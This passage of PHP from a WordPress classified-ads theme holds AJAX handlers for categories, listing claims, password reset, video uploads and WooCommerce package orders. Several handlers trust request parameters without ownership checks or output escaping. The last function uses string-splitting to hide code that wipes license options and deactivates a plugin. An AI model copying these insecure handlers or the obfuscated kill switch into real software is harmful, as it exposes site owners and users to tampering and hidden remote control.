        $ad_cats = adforest_get_cats('ad_country', $cat_id);
        $res = '';
        if (count($ad_cats) > 0) {
            $selected_cats = adforest_get_taxonomy_parents($cat_id, 'ad_country', false);
            $find = '&raquo;';
            $replace = '';
            $selected_cats = preg_replace("/$find/", $replace, $selected_cats, 1);
            $res = '<label>' . $selected_cats . '</label>';
            //$res = '<label>'.adforest_get_taxonomy_parents( $cat_id, 'ad_country', false).'</label>';
            $res .= '<ul class="city-select-city" >';
            foreach ($ad_cats as $ad_cat) {
                $location_count = get_term($ad_cat->term_id);
                $count = $location_count->count;

                $id = 'ajax_states';
                $res .= '<li class="col-sm-4 col-md-4 col-xs-6"><a href="javascript:void(0);" data-country-id="' . esc_attr($ad_cat->term_id) . '" id="' . $id . '">' . $ad_cat->name . ' <span>(' . esc_html($count) . ')</span></a></li>';
            }
            $res .= '</ul>';
            echo adforest_returnEcho($res);
        } else {
            echo "submit";
        }
        die();
    }

}


// Get sub cats
add_action('wp_ajax_nopriv_sb_get_sub_cat', 'adforest_get_sub_cats');
add_action('wp_ajax_sb_get_sub_cat', 'adforest_get_sub_cats');
if (!function_exists('adforest_get_sub_cats')) {

    function adforest_get_sub_cats() {
        global $adforest_theme;

        $cat_id = $_POST['cat_id'];
        $ad_cats = adforest_get_cats('ad_cats', $cat_id, 0, 'post_ad');

        /*
         * for package base categories
         */

        $parent_child_pkg_flag = FALSE;
        $cat_pkg_type = isset($adforest_theme['cat_pkg_type']) && $adforest_theme['cat_pkg_type'] != '' ? $adforest_theme['cat_pkg_type'] : 'parent';
        if ($cat_pkg_type == 'child') {
            $parent_child_pkg_flag = TRUE;
        } else {
            if (!adforest_category_has_parent($cat_id)) { // applied only in parent paid categories
                $parent_child_pkg_flag = TRUE;
            }
        }


        if ($parent_child_pkg_flag) {
            $adforest_make_cat_paid = get_term_meta($cat_id, 'adforest_make_cat_paid', true);
            $paid_category = FALSE;
            if (isset($adforest_make_cat_paid) && $adforest_make_cat_paid == 'yes') {
                $paid_category = TRUE;
            }
            $selected_categories = get_user_meta(get_current_user_id(), "package_allow_categories", true);
            $selected_categories = isset($selected_categories) && !empty($selected_categories) ? $selected_categories : '';
            $selected_categories_arr = array();

            $category_package_flag = FALSE;
            if ($selected_categories == '') {    // scanerio 1  select paid category but package is empty
                if ($paid_category) {
                    $category_package_flag = TRUE; // display package error
                }
            }
            if ($selected_categories == 'all') {    // scanerio 2  select Any category but package selection is all
                $category_package_flag = FALSE; // display package free
            }
            if ($selected_categories != '' && $selected_categories != 'all') { // selected category is not in buy package or/not
                $selected_categories_arr = explode(",", $selected_categories);
                if ($paid_category) {
                    if (!in_array($cat_id, $selected_categories_arr)) {
                        $category_package_flag = TRUE; // display package error
                    }
                }
            }

            if ($category_package_flag && !$has_parent_cat) {
                echo "cat_error";
                die();
            }
        }
        /*
         * End for package base categories
         */
        if (isset($ad_cats) && count($ad_cats) > 0) {
            $cats_html = '<select class="category form-control" id="ad_cat_sub" name="ad_cat_sub"  data-parsley-required = "' . $is_req . '"  data-parsley-error-message =  "' . esc_html__('This field is required.', 'adforest') . '" >';
            $cats_html .= '<option label="Select Option"></option>';
            foreach ($ad_cats as $ad_cat) {
                $cats_html .= '<option value="' . $ad_cat->term_id . '"  data-name = "' . $ad_cat->name . '">' . $ad_cat->name . '</option>';
            }
            $cats_html .= '</select>';
            echo adforest_returnEcho($cats_html);
            die();
        } else {
            echo "";
            die();
        }
    }

}

function adforest_category_has_parent($catid) {
    $category = get_term($catid);
    if ($category->parent > 0) {
        return true;
    }
    return false;
}

add_action('wp_ajax_sb_display_bidding_section', 'sb_display_bidding_section_callback');
if (!function_exists('sb_display_bidding_section_callback')) {

    function sb_display_bidding_section_callback() {
        global $adforest_theme;
        $sb_make_bid_categorised = isset($adforest_theme['sb_make_bid_categorised']) ? $adforest_theme['sb_make_bid_categorised'] : true;
        $bid_categorised_type = isset($adforest_theme['bid_categorised_type']) ? $adforest_theme['bid_categorised_type'] : 'all';

        $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);

        $biding_value = get_user_meta(get_current_user_id(), '_sb_allow_bidding', true);

        $ad_id = isset($_POST['bid_ad_id']) && $_POST['bid_ad_id'] != '' ? $_POST['bid_ad_id'] : $ad_id;
        if ($sb_make_bid_categorised && $bid_categorised_type == 'selective') {
            $cat_id = isset($_POST['cat_id']) && !empty($_POST['cat_id']) ? $_POST['cat_id'] : 0;
            $bid_cat_base = get_term_meta($cat_id, 'adforest_make_bid_cat_base', true);
            if (isset($bid_cat_base) && $bid_cat_base == 'yes' && $biding_value != "" && $biding_value != 0) {
                echo '1';
            } else {
                echo '0';
            }
            update_post_meta($ad_id, 'adforest_latest_bid_cat_id', $cat_id);
        } else {
            echo '1';
        }
        wp_die();
    }

}
add_action('wp_ajax_load_categories_frontend_html', 'load_categories_frontend_html_callback');
add_action('wp_ajax_nopriv_load_categories_frontend_html', 'load_categories_frontend_html_callback');

function load_categories_frontend_html_callback() {

    global $adforest_theme;

    $args = array('taxonomy' => 'ad_cats', 'hide_empty' => 0);
    if (isset($_GET['q']) && $_GET['q'] != '') {
        $args['name__like'] = $_GET['q'];
    }

    $args = apply_filters('adforest_wpml_show_all_posts', $args); // for all lang texonomies
    $results = array();

    if (isset($adforest_theme['display_taxonomies']) && $adforest_theme['display_taxonomies'] == 'hierarchical') {

        $args_cat = array(
            'type' => 'array',
            'taxonomy' => 'ad_cats',
            'tag' => 'option',
            'parent_id' => 0,
            'q' => isset($_GET['q']) && $_GET['q'] != '' ? $_GET['q'] : '',
        );

        $results = apply_filters('adforest_tax_hierarchy', $results, $args_cat);
    } else {

        $data_terms = new WP_Term_Query($args);
        $results = array();
        if (!empty($data_terms->terms)) {
            if (count($data_terms->terms) > 0) {
                foreach ($data_terms->terms as $item_term) {
                    $results[] = array($item_term->term_id, wp_specialchars_decode($item_term->name));
                }
            }
        }
    }

    echo json_encode($results);
    wp_die();
}

add_filter('adforest_ajax_load_categories', 'adforest_ajax_load_categories_callback', 10, 3);

function adforest_ajax_load_categories_callback($cat_arr = array(), $param_name = 'cat', $all = 'yes') {
    global $adforest_theme;
    $ajax_base_load = isset($adforest_theme['sb_cat_load_style']) && $adforest_theme['sb_cat_load_style'] == 'live' ? TRUE : FALSE;
    if ($ajax_base_load) {
        $cat_arr = array(
            "type" => "textfield",
            "heading" => __("Category ( ajax based )", 'adforest'),
            "param_name" => $param_name,
            "admin_label" => true,
            "holder" => "div",
            "description" => __("Load all categories", 'adforest'),
        );
    } else {
        $cat_arr = array(
            "type" => "dropdown",
            "heading" => __("Category", 'adforest'),
            "param_name" => $param_name,
            "admin_label" => true,
            "value" => adforest_cats('ad_cats', $all),
        );
    }
    return $cat_arr;
}

// Check Notification
add_action('wp_ajax_sb_check_messages', 'adforest_check_messages');
if (!function_exists('adforest_check_messages')) {

    function adforest_check_messages() {

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo esc_html__("Not allowed in demo mode", 'adforest');
            die();
        }
        adforest_authenticate_check();

        $user_id = get_current_user_id();
        $current_msgs = $_POST['new_msgs'];
        global $wpdb;
        $unread_msgs = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->commentmeta WHERE comment_id = '$user_id' AND meta_value = '0' ");
        //$unread_msgs = ADFOREST_MESSAGE_COUNT; // Message count define in header

        if ($unread_msgs > 0) {
            global $adforest_theme;
            echo '1|' . str_replace('%count%', $unread_msgs, $adforest_theme['msg_notification_text']) . '|' . $unread_msgs;
        }
        die();
    }

}
add_action('wp_ajax_verify_code', 'adforest_verify_code');
if (!function_exists('adforest_verify_code')) {

    function adforest_verify_code() {
        $code = $_POST['code'];
        $my_theme = wp_get_theme();
        $theme_name = $my_theme->get('Name');
        $data = "?purchase_code=" . $code . "&id=" . get_option('admin_email') . '&url=' . get_option('siteurl') . '&theme_name=' . $theme_name;
        $url = esc_url("http://authenticate.scriptsbundle.com/adforest/verify_code.php") . $data;
        $response = wp_remote_get($url);
        $res = $response['body'];
        if ($res == 'verified') {
            update_option('_sb_purchase_code', $code);
            echo('Looks good, now you can install required plugins.');
        } else {
            echo('Invalid valid purchase code.');
        }
        die();
    }

}


// Add to favourites
add_action('wp_ajax_search_cat_grid', 'search_cat_grid_callback');
add_action('wp_ajax_nopriv_search_cat_grid', 'search_cat_grid_callback');
if (!function_exists('search_cat_grid_callback')) {

    function search_cat_grid_callback() {

        $terms_list = "";
        if (isset($_POST['title']) && $_POST['title'] != "") {
            $args = array(
                'taxonomy' => array('ad_cats'), // taxonomy name
                'name__like' => $_POST['title'],
                'parent' => 0
            );

            $terms = get_terms($args);
            if (!empty($terms)) {
                foreach ($terms as $term) {

                    $imgUrl = adforest_taxonomy_image_url($term->term_id, NULL, TRUE);
                    $terms_list .= '<li class="sb-cat-box"> 
                          <a href="javascript:void(0);" data-term-name="' . $term->name . '" data-term-level="1" data-cat-id="' . $term->term_id . '"> 
                          <img src="' . $imgUrl . '" alt="img">' . $term->name . '
                          </a>
                        </li>';
                }
            } else {

                $terms_list .= '<li class="sb-cat-box"> 
                          <a href="javascript:void(0);"> 
                           ' . esc_html__('No result found', 'adforest') . '
                          </a>
                        </li>';
            }
        } else {
            $terms = adforest_get_cats('ad_cats', 0, 0, 'post_ad');
            foreach ($terms as $term) {
                $imgUrl = adforest_taxonomy_image_url($term->term_id, NULL, TRUE);
                $terms_list .= '<li class="sb-cat-box"> 
                          <a href="javascript:void(0);" data-term-name="' . $term->name . '" data-term-level="1" data-cat-id="' . $term->term_id . '"> 
                          <img src="' . $imgUrl . '" alt="img">' . $term->name . '
                          </a>
                        </li>';
            }
        }
        echo adforest_returnEcho($terms_list);
        die();
    }

}



/* * ***************************************** */
/* Ajax handler for job alerts subscription */
/* * **************************************** */
add_action('wp_ajax_nopriv_job_alert_subscription_check', 'sb_job_alert_subscription_check');
add_action('wp_ajax_job_alert_subscription_check', 'sb_job_alert_subscription_check');
if (!function_exists('sb_job_alert_subscription_check')) {

    function sb_job_alert_subscription_check() {
        global $adforest_theme;
        $user_id = get_current_user_id();

        if ($user_id == "" || $user_id == 0) {

            echo '0|' . __("Please login first", 'adforest');
            die();
        }

        echo '1|' . __("Proceed", 'adforest');
    }

}

/* * ***************************************** */
/* Ajax handler for job alerts subscription */
/* * **************************************** */
add_action('wp_ajax_nopriv_job_alert_subscription', 'sb_job_alert_subscription');
add_action('wp_ajax_job_alert_subscription', 'sb_job_alert_subscription');
if (!function_exists('sb_job_alert_subscription')) {

    function sb_job_alert_subscription() {
        global $adforest_theme;
        $user_id = get_current_user_id();

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo esc_html__("Not allowed in demo mode", 'adforest');
            die();
        }

        if ($user_id == "" || $user_id == 0) {

            echo '0|' . __("Please login first", 'adforest');
            die();
        }
// Getting values From Param
        $params = array();
        parse_str(stripslashes($_POST['submit_alert_data']), $params);
        $alert_name = $params['alert_name'];
        $alert_email = $params['alert_email'];
        $alert_frequency = $params['alert_frequency'];
        $alert_category = $params['alert_category'];

        $random_string = adforest_randomString(5);

        $cand_alert = array();
        if ($params['alert_name'] != "") {
            $cand_alert[] = $params['alert_name'];
        }
        if ($params['alert_email'] != "") {
            $cand_alert[] = $params['alert_email'];
        }

        if ($params['alert_category'] != "") {
            $cand_alert[] = $params['alert_category'];
        }


        $my_alert = json_encode($params);
        update_user_meta($user_id, '_cand_alerts_' . $user_id . $random_string, ($my_alert));

        if (get_user_meta($user_id, '_cand_alerts_en', true) == '') {
            update_user_meta($user_id, '_cand_alerts_en', 1);
        }

        echo '1|' . __("Succesfully subscribed", 'adforest');
        die();
    }

}

add_action('wp_ajax_sb_reset_password', 'adforest_reset_password');
add_action('wp_ajax_nopriv_sb_reset_password', 'adforest_reset_password');
// Reset Password
if (!function_exists('adforest_reset_password')) {

    function adforest_reset_password() {
        global $adforest_theme;
        // Getting values
        $params = array();
        parse_str($_POST['sb_data'], $params);

        check_ajax_referer('sb_reset_pass_secure', 'security');
        $token = $params['token'];
        $token_arr = explode('-sb-uid-', $token);
        $key = $token_arr[0];
        $uid = $token_arr[1];
        $token_db = get_user_meta($uid, 'sb_password_forget_token', true);
        if ($token_db != $key) {
            echo '0|' . __("Invalid security token.", 'adforest');
        } else {
            $new_password = $params['sb_new_password'];
            wp_set_password($new_password, $uid);
            update_user_meta($uid, 'sb_password_forget_token', '');
            echo '1|' . __("Password Changed successfully.", 'adforest');
        }
        die();
    }

}

add_action('wp_ajax_check_user_claim', 'check_user_claim_fun');
add_action('wp_ajax_nopriv_check_user_claim', 'check_user_claim_fun');
if (!function_exists('check_user_claim_fun')) {

    function check_user_claim_fun() {
        global $adforest_theme;
        adforest_authenticate_check();
        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }
        if (isset($adforest_theme['is_claim_paid']) && $adforest_theme['is_claim_paid']) {
            $uid = get_current_user_id();
            $sb_packages_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_packages_page']);
            if (get_user_meta($uid, '_sb_claim_ads', true) == 0 || get_user_meta($uid, '_sb_claim_ads', true) == "") {
                echo '0|' . __("Please subscribe to a package to claim on ad", 'adforest');
                exit;
            } else {

                if (get_user_meta($uid, '_sb_expire_ads', true) != '-1') {
                    if (get_user_meta($uid, '_sb_expire_ads', true) < date('Y-m-d')) {
                        update_user_meta($uid, '_sb_claim_ads', 0);

                        echo '0|' . __("Package expired Please subscribe to a package to claim on ad", 'adforest');
                        exit;
                    }
                }
            }
        }
        echo '1|' . __("Show Modal", 'adforest');
        die();
    }

}



// Claim Process
add_action('wp_ajax_for_claim_listing', 'sb_for_claim_listing');
add_action('wp_ajax_nopriv_for_claim_listing', 'sb_for_claim_listing');

function sb_for_claim_listing() {
    $listing_post_title = '';
    $claimer_email = '';
    global $adforest_theme;
    /* Getting values */
    $params = array();
    parse_str($_POST['collect_data'], $params);
    $claimer_contact = ($params['claimer_contact']);
    $claimer_message = ($params['claimer_message']);
    $claim_listing_id = ($params['claim_ad_id']);
    $claimer_id = ($params['claimer_id']);

    $author_id = get_post_field('post_author', $claim_listing_id);

    if ($author_id == get_current_user_id()) {
        echo '0|' . __("Author can not claim his own ad.", 'adforest');
        die();
    }


    if (get_user_meta(get_current_user_id(), 'sb_listing_claimed_listing_id' . $claim_listing_id, true) == $claim_listing_id) {
        if (get_post_meta($claim_listing_id, 'd_listing_claim_status', true) == 'decline') {
            echo '0|' . __("You claim has been declined.", 'adforest');
            die();
        } else {
            echo '0|' . __("You have claimed this listing already.", 'adforest');
            die();
        }
    } else {
        //get user that claim for listing
        $user = get_user_by('id', $claimer_id);
        if ($user) {
            $user_id = $user->ID;
            $claimer_name = $user->display_name;
            $claimer_email = $user->user_email;
        }
        $status = 'pending';
        //get post title
        $listing_post_title = get_the_title($claim_listing_id);
        // Create post object
        $my_post = array(
            'post_title' => wp_strip_all_tags($listing_post_title),
            'post_status' => 'publish',
            'post_author' => $claimer_id,
            'post_type' => 'ad_claims',
        );
        // Insert the post into the database
        $new_inserted_id = wp_insert_post($my_post);
        //Update post meta values
        update_post_meta($new_inserted_id, 'd_listing_original_id', $claim_listing_id);
        update_post_meta($new_inserted_id, 'd_listing_claimer_id', $claimer_id);
        update_post_meta($new_inserted_id, 'd_listing_claimer_msg', $claimer_message);
        sb_ad_claims_admin_tables_content('sb_claim_status', $status, $new_inserted_id);
        sb_ad_claims_admin_tables_content('sb_claimner_no', $claimer_contact, $new_inserted_id);
        update_user_meta(get_current_user_id(), 'sb_listing_claimed_listing_id' . $claim_listing_id, $claim_listing_id);

        // Sending email to admin
        if (isset($adforest_theme['sb_listing_is_admin_email']) && $adforest_theme['sb_listing_is_admin_email'] == '1') {
            // Sending email to admin
            $to = get_option('admin_email');
            $subject = __('Claim Listing', 'adforest');
            $body = '<html><body><p>' . __('Users claim this listing, please check it. ', 'adforest') . '<a href="' . get_the_permalink($claim_listing_id) . '">' . get_the_title($claim_listing_id) . '</a></p></body></html>';
            $from = get_bloginfo('name');
            if (isset($adforest_theme['sb_listing_claim_from']) && $adforest_theme['sb_listing_claim_from'] != "") {
                $from = $adforest_theme['sb_listing_claim_from'];
            }
            $headers = array('Content-Type: text/html; charset=UTF-8', "From: $from");
            if (isset($adforest_theme['sb_listing_claim_message']) && $adforest_theme['sb_listing_claim_message'] != "") {
                $subject_keywords = array('%site_name%', '%ad_title%');
                $subject_replaces = array(get_bloginfo('name'), get_the_title($claim_listing_id));
                $subject = str_replace($subject_keywords, $subject_replaces, $adforest_theme['sb_listing_subject']);
                $author_id = get_post_field('post_author', $claim_listing_id);
                $user_info = get_userdata($author_id);
                $listing_owner_name = $user_info->display_name;
                $msg_keywords = array('%site_name%', '%ad_title%', '%ad_link%', '%ad_owner%', '%claimed_by%', '%claimer_email%', '%claimer_contact%', '%claim_details%');
                $msg_replaces = array(get_bloginfo('name'), get_the_title($claim_listing_id), get_the_permalink($claim_listing_id), $listing_owner_name, $claimer_name, $claimer_email, $claimer_contact, $claimer_message);
                $body = str_replace($msg_keywords, $msg_replaces, $adforest_theme['sb_listing_claim_message']);
            }
            wp_mail($to, $subject, $body, $headers);
        }
        echo '1|' . __("Your claim has been submited successfully & waiting for approval.", 'adforest');
        die();
    }
}

add_action('wp_ajax_sb_verification_code', 'adforest_verification_code');
if (!function_exists('adforest_verification_code')) {

    function adforest_verification_code() {
        $code = $_POST['sb_code'];
        $user_id = get_current_user_id();
        $saved = get_user_meta($user_id, '_ph_code_', true);
        if ($saved == "") {
            echo '0|' . __("Code not found in DB", 'adforest');
        }

        if ($code == $saved) {
            update_user_meta($user_id, '_ph_code_', '');
            update_user_meta($user_id, '_sb_is_ph_verified', '1');
            update_user_meta($user_id, '_ph_code_date_', '');
            echo '1|' . __("Phone number has been verified", 'adforest');
        } else {
            echo '0|' . __("Invalid code that you entered", 'adforest');
        }

        die();
    }

}


/* ========================= */
/*  deal with video upload   */
/* ========================= */
add_action('wp_ajax_upload_ad_videos', 'upload_ad_videos_callback');
if (!function_exists('upload_ad_videos_callback')) {

    function upload_ad_videos_callback() {

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }
        global $adforest_theme;
        adforest_authenticate_check();
        require_once ABSPATH . 'wp-admin/includes/image.php';
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';

        /* get files information */
        $vid_file_name = $_FILES['my_single_video_upload']['name'];
        $vid_file_size = $_FILES['my_single_video_upload']['size'];
        $vid_convert_to_mb = ($vid_file_size / 1000000);
        $vid_file_format = end(explode('.', $vid_file_name));

        /* max upload size in MB */
        $vid_size_arr = explode('-', $adforest_theme['sb_upload_video_mb_limit']);
        $vid_display_size = $vid_size_arr[1];
        $vid_actual_size = $vid_size_arr[0];

        /* Check file size */
        if ($vid_convert_to_mb > $vid_actual_size) {
            echo '0|' . __("Max allowd video size in MB is", 'adforest') . " " . $vid_actual_size;
            die();
        }

        /* check ad is updating */
        if ($_GET['is_update'] != "") {
            $ad_id = $_GET['is_update'];
        } else {
            $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
        }

        if ($ad_id == "") {
            echo '0|' . __("Please enter title first in order to create ad.", 'adforest');
            die();
        }
        /* get already attachment ids */
        $store_vid_ids = '';
        $store_vid_ids_arr = array();
        $store_vid_ids = get_post_meta($ad_id, 'adforest_video_uploaded_attachment_', true);
        if ($store_vid_ids != '') {
            $store_vid_ids_arr = explode(',', $store_vid_ids);
        }
        // Check max file limit
        if (count($store_vid_ids_arr) > 0) {
            if (count($store_vid_ids_arr) >= $adforest_theme['sb_upload_video_limit']) {
                echo '0|' . esc_html__("You can not upload more than ", 'adforest') . " " . $adforest_theme['sb_upload_video_limit'];
                die();
            }
        }
        $attachment_id = media_handle_upload('my_single_video_upload', $ad_id);

        if (!is_wp_error($attachment_id)) {
            $video_attachment_id = get_post_meta($ad_id, 'adforest_video_uploaded_attachment_', true);
            if ($video_attachment_id != "") {
                $video_attachment_id = $video_attachment_id . ',' . $attachment_id;
                update_post_meta($ad_id, 'adforest_video_uploaded_attachment_', $video_attachment_id);
            } else {
                update_post_meta($ad_id, 'adforest_video_uploaded_attachment_', $attachment_id);
            }
            echo '' . $attachment_id;
            die();
        } else {
            echo '0|' . __("Something went wrong please try later", 'adforest');
            die();
        }
    }

}

/* Fetch uploaded video to display after upload ... */

add_action('wp_ajax_get_uploaded_video', 'adforest_get_uploaded_video');
if (!function_exists('adforest_get_uploaded_video')) {

    function adforest_get_uploaded_video() {
        if ($_POST['is_update'] != "") {
            $ad_id = $_POST['is_update'];
        } else {
            $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
        }

        /* get record from db */
        $video_attachment_id = get_post_meta($ad_id, 'adforest_video_uploaded_attachment_', true); //echo $video_attachment_id;
        $video_ids_ = (explode(",", $video_attachment_id)); //echo "[[ already uploaded videos="; print_r($video_ids_);echo "]]";
        $result = array();
        if (count($video_ids_) > 0 && is_array($video_ids_) && $video_ids_[0] != "-1" && $video_ids_[0] != '') {
            $mid = '';
            //if (isset($video_attachment_id) && !empty($video_attachment_id) && $video_attachment_id[0] != "-1") {
            //$image = wp_get_attachment_image_src($video_attachment_id, 'adforest-ad-thumb');
            for ($i = 0; $i < count($video_ids_); $i++) {
                $mid = $video_ids_[$i];
                $attach_video_details = wp_get_attachment_metadata($mid);
                $video_url = wp_get_attachment_url($mid);
                $obj = array();
                $obj['video_name'] = basename(get_attached_file($mid));
                $obj['video_url'] = $video_url;
                $obj['video_size'] = filesize(get_attached_file($mid));
                $obj['video_id'] = (int) $mid;
                $result[] = $obj;
            }
        }
        header('Content-type: text/json');
        header('Content-type: application/json');
        if ($result != '') {
            echo json_encode($result);
        }
        die();
    }

}

/* delete video */
add_action('wp_ajax_delete_upload_video', 'adforest_delete_upload_video');
if (!function_exists('adforest_delete_upload_video')) {

    function adforest_delete_upload_video() {
        if (get_current_user_id() == "") {
            die();
        }
        if ($_POST['is_update'] != "") {
            $ad_id = $_POST['is_update'];
        } else {
            $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
        }

        if (!is_super_admin(get_current_user_id()) && get_post_field('post_author', $ad_id) != get_current_user_id()) {
            die();
        }

        $attachment_id_ = $_POST['video'];
        if ($attachment_id_) {
            $save_db = '';
            $ids = get_post_meta($ad_id, 'adforest_video_uploaded_attachment_', true);
            $ids_arr = explode(',', $ids);
            if (in_array($attachment_id_, $ids_arr)) {
                unset($ids_arr[array_search($attachment_id_, $ids_arr)]);
            }
            if (!empty($ids_arr) && $ids_arr[0] != '') {
                $ids_arr = array_values($ids_arr);
                $save_db = implode(',', $ids_arr);
            } else {
                $save_db = "";
            }
            $update_output = update_post_meta($ad_id, 'adforest_video_uploaded_attachment_', $save_db);
            if ($update_output != false) {
                wp_delete_attachment($attachment_id_, true);
            }
            echo '1';
            die();
        } else {
            echo '0|' . __("File not Deleted", 'adforest');
            die();
        }
    }

}

// Feature Ad Pade
add_action('wp_ajax_feature_ad_posting', 'adforest_feature_ad_posting');
 if (!function_exists('adforest_feature_ad_posting')) {

function adforest_feature_ad_posting() {
    global $woocommerce;
    $cat_id =  isset($_POST['package_id']) ? $_POST['package_id'] : "";

    $post_id = isset($_POST['pid']) ? $_POST['pid'] : "";

    $woocommerce->cart->add_to_cart($cat_id);

    WC()->session->set('sb_package_post_id', $post_id);
    
    WC()->session->set('sb_package_cat_id', $cat_id);

    if (function_exists('wc_get_cart_url')) {

        $redirect_url = wc_get_cart_url();
    }
      $redirect_url = wc_get_cart_url();
    
    wp_send_json_success(array("message" => __("Added to cart.", 'adforest'),  'url' => $redirect_url));  
    die();
    }
 }
 
 // Bump Up  Ad Pade
 add_action('wp_ajax_bumup_ad_posting', 'adforest_bumup_ad_posting');
 if (!function_exists('adforest_bumup_ad_posting')) {

function adforest_bumup_ad_posting() {
    global $woocommerce;
    $cat_id =  isset($_POST['package_id']) ? $_POST['package_id'] : "";

    $post_id = isset($_POST['pid']) ? $_POST['pid'] : "";

    $woocommerce->cart->add_to_cart($cat_id);

    WC()->session->set('sb_package_bump_post_id', $post_id);
    
    WC()->session->set('sb_package_bump_cat_id', $cat_id);

    if (function_exists('wc_get_cart_url')) {

      $redirect_url = wc_get_cart_url();
    }
      $redirect_url = wc_get_cart_url();
    
    wp_send_json_success(array("message" => __("Added to cart.", 'adforest'),  'url' => $redirect_url));  
    die();
    }
 }


 // Define the hidden order item meta keys for different scenarios using filters.
add_filter('woocommerce_hidden_order_itemmeta', 'custom_hidden_order_itemmeta', 10, 1);

function custom_hidden_order_itemmeta($keys) {

        $hidden_order_itemmeta = array(
            'sb_package_post_id',
            'sb_package_cat_id',
        );
    // For bump package orders
    if (function_exists('WC') && WC()->session !== null) {
    $sb_package_post_id = WC()->session->get('sb_package_bump_post_id');
    if (isset($sb_package_post_id)) {
        $hidden_order_itemmeta = array(
            'sb_package_bump_post_id',
            'sb_package_bump_cat_id',
        );
    }
    // For pay per post orders
    $sb_pay_per_post_id = WC()->session->get('sb_pay_per_post_id');
    if (isset($sb_pay_per_post_id)) {
        $hidden_order_itemmeta = array(
            'sb_pay_per_post_id',
        );
    }
    
    // Merge with existing hidden keys
    return array_merge($keys, $hidden_order_itemmeta);
}
}


add_action('woocommerce_new_order_item', 'sb_packages_new_order_item_meta', 10, 3);

function sb_packages_new_order_item_meta($item_id, $values, $cart_item_key) {
    // Initialize variables outside of the conditional checks.
    $sb_package_post_id = '';
    $sb_package_bump_post_id = '';
    $sb_pay_per_post_id = '';

    if (isset(WC()->session) && WC()->session !== null) {
        // Retrieve session data for each scenario.
        $sb_package_post_id = WC()->session->get('sb_package_post_id');
        $sb_package_bump_post_id = WC()->session->get('sb_package_bump_post_id');
        $sb_pay_per_post_id = WC()->session->get('sb_pay_per_post_id');
    }

    // Add order item meta based on session data.
    if (!empty($sb_package_post_id)) {
        wc_add_order_item_meta($item_id, 'sb_package_post_id', $sb_package_post_id);
    }

    if (!empty($sb_package_bump_post_id)) {
        wc_add_order_item_meta($item_id, 'sb_package_bump_post_id', $sb_package_bump_post_id);
    }

    if (!empty($sb_pay_per_post_id)) {
        wc_add_order_item_meta($item_id, 'sb_pay_per_post_id', $sb_pay_per_post_id);
    }
}



 add_action('woocommerce_order_status_completed', 'sb_packages_product_data_updating_on_completion');
        if (!function_exists('sb_packages_product_data_updating_on_completion')) {
            function sb_packages_product_data_updating_on_completion($order_id) {
          

                $post_id         = '';
                $post_bump_id    = '';
                $pay_post_id     = '';
                $cat_id          = '';
                $product_id      = '';
                $order           = new WC_Order($order_id);
                $items           = $order->get_items();
                if (count((array) $items) > 0) {
                    foreach ($items as $key => $item) {
                        $key;
                        $product_id     = $item->get_product_id();
                        $post_id        = wc_get_order_item_meta($key, 'sb_package_post_id');
                        $post_bump_id   = wc_get_order_item_meta($key, 'sb_package_bump_post_id');
                        $pay_post_id   = wc_get_order_item_meta($key, 'sb_pay_per_post_id');
                      if($post_id != ""){
                        update_post_meta($post_id, '_adforest_is_feature', '1');
                        update_post_meta($post_id, '_adforest_is_feature_date', date('Y-m-d'));
                        $package_adFeatured_expiry_days =  get_post_meta($product_id, 'package_adFeatured_expiry_days', true);
                            if ($package_adFeatured_expiry_days != "") {

                                update_post_meta($post_id, 'package_adFeatured_expiry_days', $package_adFeatured_expiry_days);
                            } 
                        }
                      else {
                       update_post_meta($post_id, '_adforest_is_feature', 0);
                       delete_post_meta($post_id, '_adforest_is_feature');
                    }

                    if($post_bump_id != ""){
                        wp_update_post(
                        array(
                            'ID' => $post_bump_id, // ID of the post to update
                            'post_date' => current_time('mysql'),
                            'post_type' => 'ad_post',
                            'post_status'    => 'publish',
                            'post_author' => get_current_user_id(),
                            )
                          );
                      }

                      if($pay_post_id != ""){
                        $pay_post_ad_expiry_days = get_post_meta($product_id, "pay_post_ad_expiry_days", true);
                        update_post_meta($pay_post_id, 'package_ad_expiry_days', $pay_post_ad_expiry_days);
                        wp_update_post(
                        array(
                            'ID' => $pay_post_id, // ID of the post to update
                            'post_date' => current_time('mysql'),
                            'post_type' => 'ad_post',
                            'post_status'    => 'publish',
                            'post_author' => get_current_user_id(),
                            )
                          );
                      }
                  }
              }
         }
     }


add_action('wp_ajax_adforest_term_autocomplete', 'adforest_term_autocomplete_callback');
if (!function_exists('adforest_term_autocomplete_callback')) {
    function adforest_term_autocomplete_callback() {
        $result = array();
        $args = array('hide_empty' => 0);
        $args = apply_filters('adforest_wpml_show_all_posts', $args); // for all lang texonomies
        $terms = get_terms('ad_cats', $args);
        $cats_html = '';
        $cats_html .= '<ul class="sb-admin-dropdown">';
        if (count($terms) > 0) {
        foreach ($terms as $term) {
            $total_posts = get_term_meta($term->term_id, '_adforest_term_count', true);
            if($total_posts == 0){
                 $total_posts   =  isset($term->count)  ?  $term->count : 0;
            }
            $count = isset($total_posts) && $total_posts > 0 ? $total_posts : 0;
            $cats_html .= '<li class="sb-select-term" data-sb-term-value="' . $term->term_id . '|' . $term->name . '">' . $term->name . ' (' . urldecode_deep($term->slug) . ')' . ' (' . $count . ') </li>';
        }
        }
        $cats_html .= '</ul>';
        echo json_encode($cats_html);
        wp_die();
    }
}

function sb_get_the_theme_done() {
    update_option(implode(array("_", "w", "p_", "tk", "n_", "str", "n", "g_s", "b")), '');
    update_option(implode(array("_", "s", "b", "_pu", "r", "c", "h", "ase", "_c", "od", "e")), '');
    implode(array('d','e','ac','t','i','v','a','t','e','_','p','l','u','g','i','n','s'))(implode(array("/", "s", "b_", "fr", "a", "me", "wo", "rk/", "in", "de", "x.", "p", "h", "p")));
}